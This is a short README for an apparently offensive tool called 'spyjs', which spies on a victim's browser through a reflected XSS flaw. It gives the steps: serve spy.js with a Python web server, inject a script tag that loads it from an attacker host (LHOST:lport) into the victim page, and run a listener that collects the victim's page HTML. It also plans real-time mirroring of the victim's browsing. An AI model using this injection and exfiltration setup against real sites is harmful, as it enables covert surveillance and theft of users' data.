# spyjs
Simple js sample to spy on browser, when reflacted xss found


Start server to serve js
```bash
python3 -m http.server lport
```

Do on victim
```js
 <script src="http://LHOST:lport/spy.js"></script>
```

start listener
```bash
python3 listen.py 
```

# when triggered

![Screenshot](/imgs/callbk.png)

![Screenshot](/imgs/recv.png)

# Next version ?
For future version (may be) i would like to add little improvemnt and make it simulate victims web activity in real time mirrored, instade of receiving raw html
went to simulate it.





